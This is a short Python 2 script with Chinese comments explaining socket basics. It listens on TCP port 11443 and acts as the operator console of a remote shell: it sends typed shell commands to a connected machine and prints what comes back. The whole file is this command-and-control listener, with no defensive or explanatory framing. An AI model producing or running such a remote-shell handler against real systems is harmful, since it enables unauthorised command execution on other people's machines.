# coding: utf8

from socket import *

HOST =  ''
PORT = 11443

# 创建 socket 对象
s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

# 绑定主机与端口号，此处用双括号
s.bind((HOST, PORT))
# 设置最大连接数，超过后排队
s.listen(10)

conn, addr = s.accept()
print('Connected By', addr)
data = conn.recv(1024)
while 1:
    command = raw_input("Enter shell command or quit: ")
    conn.send(command)
    if command == "quit": break
    data = conn.recv(1024)
    print(data)

conn.close()
